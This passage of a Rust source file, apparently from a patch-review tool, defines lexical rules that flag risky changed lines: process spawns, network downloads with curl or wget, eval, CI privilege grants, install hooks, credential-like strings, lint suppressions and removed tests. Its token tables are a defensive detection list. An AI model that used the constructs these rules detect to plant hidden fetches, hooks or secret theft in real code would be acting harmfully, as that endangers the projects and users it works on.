// DDF integration: code-evidence risk signals with hunk addresses (plan 2026-10-30, Feature A).
// Design/status: docs/PLAN_AGENT_EVIDENCE_AND_OBSERVABILITY.md#feature-a-code-evidence-risk-signals
// Module vault note (bidirectional): obsidian://open?vault=deep-diff-forge.vault&file=Implementation%2FModules%2Fcrates--deep-diff-forge-graph--src--evidence
//! Code evidence: what the changed lines of a patch do, found in the patch alone and pointed at
//! by hunk address and line, so an agent can check each claim instead of trusting it.
//!
//! Every rule lives in one table, `RULES`: one signal, the side of the change it reads, the view it reads
//! (code with comments and strings blanked, or the raw line), where it applies, and what it
//! matches. Evidence is lexical ([`EVIDENCE_BASIS`]): it finds tokens, it never proves a change
//! is safe, and a construct split across lines or built at run time can hide from it.

use crate::lexical::{
    Carried, Language, Readings, carried_view, has_token, is_boundary_blocker, is_ident,
};
use deep_diff_forge_core::{FileStatus, HunkId, PatchHunk, PatchLineKind, ReviewFile};
use std::cell::Cell;

/// How every evidence item was found.
pub const EVIDENCE_BASIS: &str = "lexical";

/// The most evidence items a file reports; the score still counts every signal found.
pub const MAX_EVIDENCE_PER_FILE: usize = 32;

/// The most text the reading carried from one hunk of a created file to the next reads in a
/// whole patch: bytes of the lines of the new side, each counted with its end. The created
/// files of a patch share it in patch order ([`CarriedShares`]): each is read together from
/// its first hunk up to the hunk that would take it past what the files before it left, and
/// each hunk from that one on alone.
const CARRIED_BYTES: usize = 256 * 1024;

/// The longest line, in bytes, the reading carried from hunk to hunk reads: the hunk that has
/// a longer line on its new side, and every hunk after it, is read alone. The cost of the
/// released JavaScript scanner grows as the square of a word's length, so this, with
/// [`CARRIED_BYTES`], is what bounds the time the carried reading takes.
const CARRIED_LINE_BYTES: usize = 512;

/// What a changed line does that a reviewer should see first.
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Hash)]
pub enum EvidenceSignal {
    /// Rust `unsafe` added.
    UnsafeAdded,
    /// A process is started (`Command::new`, `subprocess`, `child_process`, `exec.Command`).
    ProcessSpawn,
    /// A network call or download (`reqwest`, `requests`, `fetch(`, `curl`, `wget`).
    NetworkFetch,
    /// Code built and run from data (`eval(`, `exec(`, `new Function(`, shell `eval`).
    DynamicEval,
    /// A CI workflow gains a privilege (`pull_request_target`, write permissions, inherited
    /// secrets).
    CiPrivilege,
    /// Code that runs at build or install time (`build.rs`, `setup.py`, npm install hooks).
    BuildHook,
    /// Text shaped like a credential (a private key header, a cloud or forge token).
    SecretLike,
    /// A lint, type or coverage check is switched off (`#[allow(`, `# noqa`, `@ts-ignore`).
    CheckSuppressed,
    /// A test is removed.
    TestRemoved,
}

impl EvidenceSignal {
    /// Every signal, in the order scores and output list them.
    pub const ALL: [Self; 9] = [
        Self::UnsafeAdded,
        Self::ProcessSpawn,
        Self::NetworkFetch,
        Self::DynamicEval,
        Self::CiPrivilege,
        Self::BuildHook,
        Self::SecretLike,
        Self::CheckSuppressed,
        Self::TestRemoved,
    ];

    /// Stable snake-case label for machine output.
    #[must_use]
    pub const fn label(self) -> &'static str {
        match self {
            Self::UnsafeAdded => "unsafe_added",
            Self::ProcessSpawn => "process_spawn",
            Self::NetworkFetch => "network_fetch",
            Self::DynamicEval => "dynamic_eval",
            Self::CiPrivilege => "ci_privilege",
            Self::BuildHook => "build_hook",
            Self::SecretLike => "secret_like",
            Self::CheckSuppressed => "check_suppressed",
            Self::TestRemoved => "test_removed",
        }
    }

    /// The score a file gains once for carrying this signal (the one weight table).
    #[must_use]
    pub const fn weight(self) -> u32 {
        match self {
            Self::SecretLike => 5,
            Self::UnsafeAdded | Self::ProcessSpawn | Self::DynamicEval | Self::CiPrivilege => 4,
            Self::NetworkFetch | Self::BuildHook | Self::TestRemoved => 3,
            Self::CheckSuppressed => 2,
        }
    }
}

/// Which side of the change a line is on.
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Hash)]
pub enum Side {
    /// An added line, numbered on the new side.
    New,
    /// A removed line, numbered on the old side.
    Old,
}

impl Side {
    /// Stable label for machine output.
    #[must_use]
    pub const fn label(self) -> &'static str {
        match self {
            Self::New => "new",
            Self::Old => "old",
        }
    }
}

/// One piece of evidence: a signal at a line of a hunk.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Evidence {
    pub signal: EvidenceSignal,
    /// The hunk, by id (for anchors) and by address (for machines).
    pub hunk: HunkId,
    pub address: String,
    pub side: Side,
    /// The line number on `side`.
    pub line: u32,
}

/// One finding of a hunk's scan: the side, the signal, the line, and whether the reading every
/// release up to 0.8.3 had finds it, alone or as well as another reading (a released finding;
/// `false`: only a further reading finds it). The mark travels beside the public [`Evidence`],
/// which keeps the shape it was released with ([`file_evidence_marked`]).
type Item = (Side, EvidenceSignal, u32, bool);

/// What part of a line a rule reads.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum View {
    /// Comments and string contents blanked.
    Code,
    /// The line as written (a suppression lives in a comment, a secret in a string).
    Raw,
}

/// Where a rule applies.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum Scope {
    /// Files of these languages.
    Languages(&'static [Language]),
    /// Any file, any language or none.
    Any,
    /// CI workflow definitions (`.github/workflows/*.yml`, `.gitlab-ci.yml`).
    CiWorkflow,
    /// Build and install scripts (`build.rs`, `setup.py`).
    BuildScript,
    /// `package.json`.
    PackageJson,
}

/// What a rule looks for.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum Match {
    /// Any of these tokens. A trailing `*` makes a token a prefix (no boundary after it).
    Tokens(&'static [&'static str]),
    /// Any line with code on it.
    AnyCode,
    /// A credential-shaped string ([`looks_like_secret`]).
    Secret,
    /// A JS import of one of these modules ([`imports_module`]).
    Imports(&'static [&'static str]),
}

#[derive(Debug, Clone, Copy)]
struct Rule {
    signal: EvidenceSignal,
    side: Side,
    view: View,
    scope: Scope,
    matches: Match,
}

const RUST: &[Language] = &[Language::Rust];
const PYTHON: &[Language] = &[Language::Python];
const JS: &[Language] = &[Language::JavaScript];
const GO: &[Language] = &[Language::Go];
const SHELL: &[Language] = &[Language::Shell];
const SHELL_OR_YAML: &[Language] = &[Language::Shell, Language::Yaml];

const fn rule(
    signal: EvidenceSignal,
    side: Side,
    view: View,
    scope: Scope,
    matches: Match,
) -> Rule {
    Rule {
        signal,
        side,
        view,
        scope,
        matches,
    }
}

use EvidenceSignal as S;

/// Every evidence rule. A test builds one positive case per token from this table, so a token
/// cannot be added without a case that finds it.
const RULES: &[Rule] = &[
    rule(
        S::UnsafeAdded,
        Side::New,
        View::Code,
        Scope::Languages(RUST),
        Match::Tokens(&["unsafe"]),
    ),
    rule(
        S::ProcessSpawn,
        Side::New,
        View::Code,
        Scope::Languages(RUST),
        Match::Tokens(&["Command::new", "process::Command"]),
    ),
    rule(
        S::ProcessSpawn,
        Side::New,
        View::Code,
        Scope::Languages(PYTHON),
        Match::Tokens(&[
            "subprocess.",
            "os.system(",
            "os.popen(",
            "os.exec*",
            "os.spawn*",
            "pty.spawn(",
        ]),
    ),
    rule(
        S::ProcessSpawn,
        Side::New,
        View::Code,
        Scope::Languages(JS),
        Match::Tokens(&["child_process", "execSync(", "spawnSync(", "execFileSync("]),
    ),
    // The module is always named in a string, which the code view blanks, so the specifier is
    // read from the raw line wherever the code view shows an import.
    rule(
        S::ProcessSpawn,
        Side::New,
        View::Code,
        Scope::Languages(JS),
        Match::Imports(&["child_process"]),
    ),
    rule(
        S::ProcessSpawn,
        Side::New,
        View::Code,
        Scope::Languages(GO),
        Match::Tokens(&["exec.Command(", "exec.CommandContext(", "syscall.Exec("]),
    ),
    rule(
        S::NetworkFetch,
        Side::New,
        View::Code,
        Scope::Languages(RUST),
        Match::Tokens(&[
            "reqwest::",
            "ureq::",
            "TcpStream::connect",
            "UdpSocket::bind",
        ]),
    ),
    rule(
        S::NetworkFetch,
        Side::New,
        View::Code,
        Scope::Languages(PYTHON),
        Match::Tokens(&[
            "requests.",
            "urllib.request",
            "http.client",
            "socket.socket(",
        ]),
    ),
    rule(
        S::NetworkFetch,
        Side::New,
        View::Code,
        Scope::Languages(JS),
        Match::Tokens(&[
            "fetch(",
            "XMLHttpRequest",
            "http.request(",
            "https.request(",
        ]),
    ),
    rule(
        S::NetworkFetch,
        Side::New,
        View::Code,
        Scope::Languages(GO),
        Match::Tokens(&["http.Get(", "http.Post(", "http.NewRequest(", "net.Dial("]),
    ),
    rule(
        S::NetworkFetch,
        Side::New,
        View::Code,
        Scope::Languages(SHELL_OR_YAML),
        Match::Tokens(&["curl", "wget"]),
    ),
    rule(
        S::DynamicEval,
        Side::New,
        View::Code,
        Scope::Languages(PYTHON),
        Match::Tokens(&["eval(", "exec(", "compile(", "__import__("]),
    ),
    rule(
        S::DynamicEval,
        Side::New,
        View::Code,
        Scope::Languages(JS),
        Match::Tokens(&["eval(", "new Function("]),
    ),
    rule(
        S::DynamicEval,
        Side::New,
        View::Code,
        Scope::Languages(SHELL),
        Match::Tokens(&["eval"]),
    ),
    rule(
        S::CiPrivilege,
        Side::New,
        View::Code,
        Scope::CiWorkflow,
        Match::Tokens(&[
            "pull_request_target",
            "write-all",
            "contents: write",
            "id-token: write",
            "packages: write",
            "actions: write",
            "secrets: inherit",
        ]),
    ),
    rule(
        S::BuildHook,
        Side::New,
        View::Code,
        Scope::BuildScript,
        Match::AnyCode,
    ),
    rule(
        S::BuildHook,
        Side::New,
        View::Raw,
        Scope::PackageJson,
        Match::Tokens(&[
            "\"preinstall\"",
            "\"install\"",
            "\"postinstall\"",
            "\"prepare\"",
        ]),
    ),
    rule(
        S::SecretLike,
        Side::New,
        View::Raw,
        Scope::Any,
        Match::Secret,
    ),
    rule(
        S::CheckSuppressed,
        Side::New,
        View::Raw,
        Scope::Languages(RUST),
        Match::Tokens(&["#[allow(", "#![allow("]),
    ),
    rule(
        S::CheckSuppressed,
        Side::New,
        View::Raw,
        Scope::Languages(PYTHON),
        Match::Tokens(&[
            "# noqa",
            "#noqa",
            "# type: ignore",
            "# nosec",
            "# pragma: no cover",
        ]),
    ),
    rule(
        S::CheckSuppressed,
        Side::New,
        View::Raw,
        Scope::Languages(JS),
        Match::Tokens(&[
            "eslint-disable",
            "@ts-ignore",
            "@ts-nocheck",
            "@ts-expect-error",
        ]),
    ),
    rule(
        S::CheckSuppressed,
        Side::New,
        View::Raw,
        Scope::Languages(GO),
        Match::Tokens(&["//nolint", "// nolint", "#nosec"]),
    ),
    rule(
        S::TestRemoved,
        Side::Old,
        View::Code,
        Scope::Languages(RUST),
        Match::Tokens(&["#[test]", "#[tokio::test]", "#[rstest]"]),
    ),
    rule(
        S::TestRemoved,
        Side::Old,
        View::Code,
        Scope::Languages(PYTHON),
        Match::Tokens(&["def test*", "async def test*"]),
    ),
    rule(
        S::TestRemoved,
        Side::Old,
        View::Code,
        Scope::Languages(JS),
        Match::Tokens(&["it(", "test(", "describe("]),
    ),
    rule(
        S::TestRemoved,
        Side::Old,
        View::Code,
        Scope::Languages(GO),
        Match::Tokens(&["func Test*"]),
    ),
];

/// What a file is, for rule scopes.
struct FileKind {
    language: Option<Language>,
    ci_workflow: bool,
    build_script: bool,
    package_json: bool,
}

impl FileKind {
    fn of(file: &ReviewFile) -> Self {
        let path = file.path.as_str();
        let name = path.rsplit('/').next().unwrap_or(path);
        // A shebang is read from the first line of a new side that starts at line 1.
        let first_line = file
            .patch_twin
            .hunks
            .first()
            .filter(|h| h.new_start == Some(1))
            .and_then(|h| h.lines.iter().find(|l| l.kind != PatchLineKind::Removed))
            .map(|l| l.text.as_str());
        // One extension table: the lexical layer's.
        let yaml = Language::of(path, None) == Some(Language::Yaml);
        let generated = crate::risk::is_generated_or_vendored(path);
        Self {
            language: Language::of(path, first_line),
            ci_workflow: ((path.starts_with(".github/workflows/")
                || path.contains("/.github/workflows/"))
                && yaml)
                || name == ".gitlab-ci.yml",
            // These two are path-scoped (the file's role, not its tokens), so like every path
            // signal they do not apply under a generated or vendored path. Token rules do.
            build_script: (name == "build.rs" || name == "setup.py") && !generated,
            package_json: name == "package.json" && !generated,
        }
    }

    fn admits(&self, scope: Scope) -> bool {
        match scope {
            Scope::Any => true,
            Scope::Languages(languages) => self.language.is_some_and(|l| languages.contains(&l)),
            Scope::CiWorkflow => self.ci_workflow,
            Scope::BuildScript => self.build_script,
            Scope::PackageJson => self.package_json,
        }
    }
}

/// Every piece of evidence in `file`, in hunk order, then line order, then rule order, with no
/// duplicates and no cap (callers cap what they print with [`MAX_EVIDENCE_PER_FILE`]).
///
/// `file` is read as the only file of its patch: a file the patch creates in several hunks
/// has the whole of the patch's carried reading ([`CarriedShares`]). [`crate::rank`] reads
/// each file of a patch with its share of it.
#[must_use]
pub fn file_evidence(file: &ReviewFile) -> Vec<Evidence> {
    file_evidence_marked(file, Share::Own).0
}

/// Not part of the API, and may change (the fuzz crate uses it). For each item of
/// [`file_evidence`], in its order: whether the reading every release up to 0.8.3 had finds
/// it. A ranked file's bounded list holds those items first
/// ([`crate::RankedFile`]), so it never lists fewer of them than 0.8.3 listed; the
/// `evidence_scan` fuzz target holds that with this. `file` is read as the only file of its
/// patch, as by [`file_evidence`].
#[doc(hidden)]
#[must_use]
pub fn file_evidence_released(file: &ReviewFile) -> Vec<bool> {
    file_evidence_marked(file, Share::Own).1
}

/// [`file_evidence`], and beside it, item for item, whether the item is a released finding;
/// with the hunks read together that `share` says.
pub(crate) fn file_evidence_marked(file: &ReviewFile, share: Share) -> (Vec<Evidence>, Vec<bool>) {
    let kind = FileKind::of(file);
    let rules: Vec<&Rule> = RULES.iter().filter(|r| kind.admits(r.scope)).collect();
    let mut out: Vec<Evidence> = Vec::new();
    let mut marks: Vec<bool> = Vec::new();
    if rules.is_empty() {
        return (out, marks);
    }
    let mut labels = HunkLabels::with(file, kind, rules, share);
    for (index, hunk) in file.patch_twin.hunks.iter().enumerate() {
        let mut address = None;
        // A hunk's scan yields each (side, signal, line) once and items from different hunks
        // differ in `hunk`, so there is nothing to deduplicate: a scan of `out` per item made a
        // patch of 160k matching lines take 4.8 s.
        for (side, signal, line, released) in labels.matches(index) {
            let address = address
                .get_or_insert_with(|| hunk.address(&file.path))
                .clone();
            out.push(Evidence {
                signal,
                hunk: hunk.id,
                address,
                side,
                line,
            });
            marks.push(released);
        }
    }
    (out, marks)
}

/// The distinct signals in one hunk of `file`, in [`EvidenceSignal::ALL`] order, for the hunk
/// given, read alone: what every release up to 0.8.3 answered, with what the second reading
/// of Rust finds added. It needs none of the file's other hunks and costs the hunk's own
/// lines at every call.
///
/// The views of a patch ask this only for the hunks of a file that is not read as one text
/// (its share of the patch's carried reading is under two hunks). For a file that is, the
/// outline and the listing of every hunk take the labels of its hunks from the ranking's own
/// reading of it (its evidence, read with the patch's shares), and a listing by path or by
/// address asks a [`HunkLabels`] made with the patch's shares ([`HunkLabels::in_patch`]).
#[must_use]
pub fn hunk_signals(file: &ReviewFile, hunk: &PatchHunk) -> Vec<EvidenceSignal> {
    let kind = FileKind::of(file);
    let rules: Vec<&Rule> = RULES.iter().filter(|r| kind.admits(r.scope)).collect();
    distinct(&hunk_matches(hunk, kind.language, &rules))
}

/// The distinct signals of `found`, in [`EvidenceSignal::ALL`] order.
fn distinct(found: &[(Side, EvidenceSignal, u32)]) -> Vec<EvidenceSignal> {
    EvidenceSignal::ALL
        .into_iter()
        .filter(|signal| found.iter().any(|(_, s, _)| s == signal))
        .collect()
}

/// What reading has cost, counted and not timed: how many times lines were scanned (a view of
/// a line is made by one scan of it or by several, one for each reading the view unites), how
/// many times a rule was asked of a line or of a view, and how many of the views made here
/// were alive at once at the most; and the bytes of lines the reading carried from hunk to
/// hunk read.
#[derive(Debug, Default)]
struct Work {
    scans: Cell<usize>,
    rules: Cell<usize>,
    alive: Cell<usize>,
    most: Cell<usize>,
    carried: Cell<usize>,
}

thread_local! {
    /// The bytes of lines the reading carried from hunk to hunk has read on this thread, each
    /// line counted with its end ([`carried_bytes_on_this_thread`]).
    static CARRIED_ON_THREAD: Cell<usize> = const { Cell::new(0) };
}

/// Not part of the API, and may change: the bytes of lines the reading carried from hunk to
/// hunk has read on this thread since it started, each line counted with its end, by every
/// reader. The tests that hold what one request reads, whatever readers it makes, take the
/// difference before and after it.
#[doc(hidden)]
#[must_use]
pub fn carried_bytes_on_this_thread() -> usize {
    CARRIED_ON_THREAD.with(Cell::get)
}

impl Work {
    /// The view of `line` in the reading carried from hunk to hunk, from `state`, counted.
    fn carried_view(&self, language: Language, line: &str, state: &mut Carried) -> Live<'_> {
        let bytes = line.len() + 1;
        self.carried.set(self.carried.get() + bytes);
        CARRIED_ON_THREAD.with(|read| read.set(read.get() + bytes));
        self.view(carried_view(language, line, state))
    }

    /// Counts a view of a line just made, by `scans` scans of the line, until it is dropped.
    fn view(&self, (text, scans): (String, usize)) -> Live<'_> {
        self.scans.set(self.scans.get() + scans);
        self.alive.set(self.alive.get() + 1);
        self.most.set(self.most.get().max(self.alive.get()));
        Live { text, work: self }
    }
}

/// A view of a line, alive.
struct Live<'w> {
    text: String,
    work: &'w Work,
}

impl Drop for Live<'_> {
    fn drop(&mut self) {
        self.work.alive.set(self.work.alive.get() - 1);
    }
}

/// Which readings of a line a scan asks: all of them, everywhere but in the tests that ask
/// what one reading alone finds.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum Views {
    All,
    /// The reading every release up to 0.8.3 had, alone.
    #[cfg(test)]
    Released,
    /// The lexer reading alone (for a language that has none, its one reading).
    #[cfg(test)]
    Lexer,
}

/// The signals of a file's hunks, asked one hunk at a time.
///
/// Every hunk is read alone, as every release up to 0.8.3 read it. The hunks of a section
/// that creates a file are also read as one text, in the order of the patch: such a hunk is
/// read once more from what the hunks before it left open, one state, when that is something
/// (a block comment or a string). That is the only reading that goes from one hunk to
/// another; the hunks of a file that exists are read each on its own, whatever their numbers
/// say.
///
/// The hunks read together are bounded for the whole patch ([`CarriedShares`]): the created
/// files share 256 KiB of the new side (each line counted with its end) in patch order, and
/// none of the lines read together is longer than 512 bytes. A creation is read together from
/// its first hunk up to the hunk that would take it past what the files before it left, or
/// that has a longer line; from that hunk on, each hunk is read alone, as in 0.8.3. Where that
/// is depends on the patch alone, so every hunk has the same labels however the hunks are
/// asked for, and one request reads at most 256 KiB in the carried reading, whatever it asks.
/// [`Self::new`] and [`Self::naming`] read the file as the only file of its patch; the views
/// of a patch read it with its share ([`Self::in_patch`]).
///
/// What it costs, for any patch. For each side a line is on, one view of it is made as 0.8.3
/// made it, and for Rust one more as the compiler's lexer reads it; on its new side one more
/// when it stands in a later hunk of a creation, read together, that came into something
/// open. A view is
/// made by scanning the line once for each reading it unites: at most eight times for the
/// view of 0.8.3 (as in 0.8.3), five for the lexer's, and five (Rust) or eight for the
/// carried one; for ordinary text once each. A view leaves the state the next hunk goes on
/// from, so no line is read only to pass a state on. The rules of a signal are asked in
/// their order until one finds something, as in 0.8.3. Of the views made here one is alive
/// at a time (the view of 0.8.3 keeps one string for each of its scans while it unites
/// them, as it always did). What is kept:
///
/// - For hunks asked for in file order ([`Self::new`], or [`Self::in_patch`] naming none: the
///   rank's reading of each file, with its share, and a listing by path), one state, however
///   many hunks the file has. The outline and the listing of every hunk make no reader of
///   their own: they take the labels from the rank's reading.
/// - For hunks asked for in any other order, which are named first ([`Self::naming`], or
///   [`Self::in_patch`] naming them: a listing by address), the labels of the named hunks of
///   a creation, eight bytes each. The file is gone through once, as far as the last hunk
///   named; a hunk on the way that was not named is scanned once, for the state alone.
/// - A hunk of a creation behind the place the reading has come to, that was not named, is
///   answered by going through the file again from its top, as far as that hunk and never
///   past the file's share above (no view of a patch asks for one).
pub struct HunkLabels<'a> {
    file: &'a ReviewFile,
    kind: FileKind,
    rules: Vec<&'static Rule>,
    /// The file is one the patch creates, in a language, and more than one of its hunks are
    /// read together: those hunks are also one text.
    one_text: Option<Language>,
    /// How many of the file's hunks, from the first, are read together: its share of the
    /// patch's carried reading ([`CarriedShares`]).
    together: usize,
    /// The hunks named to be asked for in any order, ascending.
    named: Vec<u32>,
    /// The named hunks the reading has come to, ascending, each with its labels as bits in
    /// [`EvidenceSignal::ALL`] order.
    labels: Vec<(u32, u16)>,
    /// Where the reading of a creation stands: the first hunk not come to, and what the
    /// hunks before it left open.
    at: Option<(usize, Carried)>,
    work: Work,
}

impl<'a> HunkLabels<'a> {
    /// A reader for hunks asked for in file order, of `file` read as the only file of its
    /// patch.
    #[must_use]
    pub fn new(file: &'a ReviewFile) -> Self {
        Self::sharing(file, Share::Own)
    }

    /// A reader for the hunks `asked`, given in the order they will be asked for, of `file`
    /// read as the only file of its patch. In file order this is [`Self::new`]; in any other
    /// order the labels of these hunks are kept as the file is gone through, so each is
    /// answered without going through it again.
    #[must_use]
    pub fn naming(file: &'a ReviewFile, asked: &[usize]) -> Self {
        Self::new(file).name(asked)
    }

    /// Not part of the API, and may change: a reader for the hunks `asked` (none: in file
    /// order), as [`Self::naming`], of `file` read with its share of its patch's carried
    /// reading: `file` is the file at `index` of the files `shares` was made from. Every view
    /// of a patch reads its files so.
    #[doc(hidden)]
    #[must_use]
    pub fn in_patch(
        file: &'a ReviewFile,
        shares: &CarriedShares,
        index: usize,
        asked: &[usize],
    ) -> Self {
        Self::sharing(file, shares.share(index)).name(asked)
    }

    fn sharing(file: &'a ReviewFile, share: Share) -> Self {
        let kind = FileKind::of(file);
        let rules = RULES.iter().filter(|r| kind.admits(r.scope)).collect();
        Self::with(file, kind, rules, share)
    }

    /// Names the hunks `asked`, when they are not in file order.
    fn name(mut self, asked: &[usize]) -> Self {
        if self.one_text.is_some() && !asked.is_sorted_by(|a, b| a < b) {
            // A hunk past the file's share is read alone and needs nothing kept.
            self.named = asked
                .iter()
                .filter(|&&index| index < self.together)
                .filter_map(|&index| u32::try_from(index).ok())
                .collect();
            self.named.sort_unstable();
            self.named.dedup();
        }
        self
    }

    fn with(file: &'a ReviewFile, kind: FileKind, rules: Vec<&'static Rule>, share: Share) -> Self {
        let language = one_text_language(file, &kind, !rules.is_empty());
        let together = match share {
            _ if language.is_none() => 0,
            Share::Own => read_together(&file.patch_twin.hunks, CARRIED_BYTES).0,
            Share::Of(together) => together.min(file.patch_twin.hunks.len()),
        };
        Self {
            file,
            // A creation with fewer than two hunks in its share has nothing carried.
            one_text: language.filter(|_| together > 1),
            together,
            kind,
            rules,
            named: Vec::new(),
            labels: Vec::new(),
            at: None,
            work: Work::default(),
        }
    }

    /// The distinct signals in hunk `index` of the file, in [`EvidenceSignal::ALL`] order.
    #[must_use]
    pub fn of(&mut self, index: usize) -> Vec<EvidenceSignal> {
        if let Some(bits) = self.kept_labels(index) {
            return EvidenceSignal::ALL
                .into_iter()
                .enumerate()
                .filter(|(bit, _)| bits & (1 << bit) != 0)
                .map(|(_, signal)| signal)
                .collect();
        }
        let found: Vec<_> = self
            .matches(index)
            .into_iter()
            .map(|(side, signal, line, _)| (side, signal, line))
            .collect();
        distinct(&found)
    }

    /// Not part of the API, and may change: how many times lines were scanned so far, inside
    /// the views made of them (a view unites one scan of its line for each reading it holds).
    /// The tests that hold what a request costs count with it.
    #[doc(hidden)]
    #[must_use]
    pub fn scans(&self) -> usize {
        self.work.scans.get()
    }

    /// Not part of the API, and may change: how many times a rule was asked of a line or of
    /// a view of one so far.
    #[doc(hidden)]
    #[must_use]
    pub fn rule_evaluations(&self) -> usize {
        self.work.rules.get()
    }

    /// Not part of the API, and may change: the most views of lines made by this reader that
    /// were alive at once so far (not the views the released scanner keeps inside its own
    /// view while it unites them). The tests that hold what a scan keeps count with it.
    #[doc(hidden)]
    #[must_use]
    pub fn views_alive_at_most(&self) -> usize {
        self.work.most.get()
    }

    /// Not part of the API, and may change: how many entries are kept now, the labels of
    /// named hunks and the one state of the reading in file order while it is under way.
    #[doc(hidden)]
    #[must_use]
    pub fn entries_kept(&self) -> usize {
        self.labels.len() + usize::from(self.at.is_some())
    }

    /// Not part of the API, and may change: the bytes of lines the reading carried from hunk
    /// to hunk read so far, each line counted with its end. The tests that hold its bound count
    /// with it.
    #[doc(hidden)]
    #[must_use]
    pub fn carried_bytes(&self) -> usize {
        self.work.carried.get()
    }

    /// Not part of the API, and may change: how many of the file's hunks, from the first, are
    /// read together as one text (none for a file that is not such a creation).
    #[doc(hidden)]
    #[must_use]
    pub fn read_together(&self) -> usize {
        if self.one_text.is_some() {
            self.together
        } else {
            0
        }
    }

    /// The labels kept for hunk `index`, when it is a named hunk the reading has come to.
    fn kept_labels(&self, index: usize) -> Option<u16> {
        let index = u32::try_from(index).ok()?;
        let at = self.labels.binary_search_by_key(&index, |&(hunk, _)| hunk);
        at.ok().map(|at| self.labels[at].1)
    }

    /// Whether hunk `index` is one of the hunks named to be asked for in any order.
    fn is_named(&self, index: usize) -> bool {
        u32::try_from(index).is_ok_and(|index| self.named.binary_search(&index).is_ok())
    }

    /// The findings of hunk `index`: [`hunk_matches`], and for a later hunk of a creation that
    /// comes into something open also what the reading carried into it finds (which is never
    /// a released finding).
    fn matches(&mut self, index: usize) -> Vec<Item> {
        let file = self.file;
        let hunks = &file.patch_twin.hunks;
        if index >= hunks.len() || self.rules.is_empty() {
            return Vec::new();
        }
        let language = self.kind.language;
        // A hunk past the bound, like a hunk of any file not read as one text, is read alone.
        let Some(text_language) = self.one_text.filter(|_| index < self.together) else {
            return scan_hunk(
                &hunks[index],
                language,
                &self.rules,
                Views::All,
                None,
                &self.work,
            );
        };
        // The reading in file order, brought as far as this hunk: from where it stands, or
        // from the top of the file again when it has gone past.
        let (mut next, mut carried) = self
            .at
            .take()
            .filter(|(next, _)| *next <= index)
            .unwrap_or_default();
        while next < index {
            if self.is_named(next) && self.kept_labels(next).is_none() {
                // A named hunk on the way: its labels are kept now.
                let found = scan_hunk(
                    &hunks[next],
                    language,
                    &self.rules,
                    Views::All,
                    Some(&mut carried),
                    &self.work,
                );
                self.keep(next, &found);
            } else {
                // Any other: one scan of each line, for what it leaves open.
                for line in &hunks[next].lines {
                    if line.kind != PatchLineKind::Removed {
                        drop(
                            self.work
                                .carried_view(text_language, &line.text, &mut carried),
                        );
                    }
                }
            }
            next += 1;
        }
        let found = scan_hunk(
            &hunks[index],
            language,
            &self.rules,
            Views::All,
            Some(&mut carried),
            &self.work,
        );
        self.keep(index, &found);
        // Once the last named hunk is answered, every named hunk is answered from what is
        // kept, and the reading is done with.
        let last_named = self.named.last().map(|&last| usize::try_from(last));
        self.at = match last_named {
            Some(Ok(last)) if last <= index => None,
            _ => Some((index + 1, carried)),
        };
        found
    }

    /// Keeps the labels of hunk `index`, when it is a named hunk.
    fn keep(&mut self, index: usize, found: &[Item]) {
        if !self.is_named(index) || self.kept_labels(index).is_some() {
            return;
        }
        let Ok(hunk) = u32::try_from(index) else {
            return;
        };
        let bits = EvidenceSignal::ALL
            .into_iter()
            .enumerate()
            .filter(|(_, signal)| found.iter().any(|(_, s, _, _)| s == signal))
            .fold(0u16, |bits, (bit, _)| bits | (1 << bit));
        let at = self.labels.partition_point(|&(kept, _)| kept < hunk);
        self.labels.insert(at, (hunk, bits));
    }
}

/// The language a file is read in as one text, when it is: a file the patch creates in more
/// than one hunk, in a language, that some rule reads (`has_rules`).
fn one_text_language(file: &ReviewFile, kind: &FileKind, has_rules: bool) -> Option<Language> {
    let created = file.status == FileStatus::Added && file.patch_twin.hunks.len() > 1;
    kind.language.filter(|_| created && has_rules)
}

/// How many of a creation's `hunks`, from the first, can be read together with `left` bytes
/// of the carried reading left, and the bytes of those hunks: up to the first hunk with a
/// line on its new side longer than [`CARRIED_LINE_BYTES`], or that takes the bytes of the
/// new side (each line counted with its end) past `left`. It reads at most that much of them.
fn read_together(hunks: &[PatchHunk], left: usize) -> (usize, usize) {
    let mut bytes = 0usize;
    for (index, hunk) in hunks.iter().enumerate() {
        let before = bytes;
        for line in &hunk.lines {
            if line.kind == PatchLineKind::Removed {
                continue;
            }
            bytes += line.text.len() + 1;
            if line.text.len() > CARRIED_LINE_BYTES || bytes > left {
                return (index, before);
            }
        }
    }
    (hunks.len(), bytes)
}

/// How many hunks of a file are read together.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub(crate) enum Share {
    /// As the only file of its patch: the whole of [`CARRIED_BYTES`].
    Own,
    /// As many as its patch's [`CarriedShares`] gave it.
    Of(usize),
}

/// Not part of the API, and may change: how many hunks of each file of a patch, from the
/// first, are read together as one text. The files a patch creates in more than one hunk,
/// in a language that some rule reads, share one carried reading of 256 KiB of new side
/// (each line counted with its end) in patch order: each, in its turn, has the hunks that
/// fit in what the files before it left, as far as the first hunk with a line longer than
/// 512 bytes, and what it has is taken from what is left. A file with fewer than two such
/// hunks is not read as one text and takes nothing. It is worked out from the patch alone, so
/// every view of a patch gives every hunk the same labels, and the carried reading of one
/// request, of a view over the whole patch or of any hunks of it in any order, reads at most
/// 256 KiB in all.
#[doc(hidden)]
#[derive(Debug, Clone, Default, PartialEq, Eq)]
pub struct CarriedShares {
    together: Vec<usize>,
}

impl CarriedShares {
    /// The shares of the files of a patch, `files`, all of them in patch order.
    #[must_use]
    pub fn of(files: &[ReviewFile]) -> Self {
        let mut left = CARRIED_BYTES;
        let together = files
            .iter()
            .map(|file| {
                if file.status != FileStatus::Added || file.patch_twin.hunks.len() < 2 {
                    return 0;
                }
                let kind = FileKind::of(file);
                let has_rules = RULES.iter().any(|r| kind.admits(r.scope));
                if one_text_language(file, &kind, has_rules).is_none() {
                    return 0;
                }
                let (together, bytes) = read_together(&file.patch_twin.hunks, left);
                if together < 2 {
                    return 0;
                }
                left -= bytes;
                together
            })
            .collect();
        Self { together }
    }

    /// How many hunks, from the first, of the file at `index` are read together as one text
    /// (none for a file that is not so read).
    #[must_use]
    pub fn read_together(&self, index: usize) -> usize {
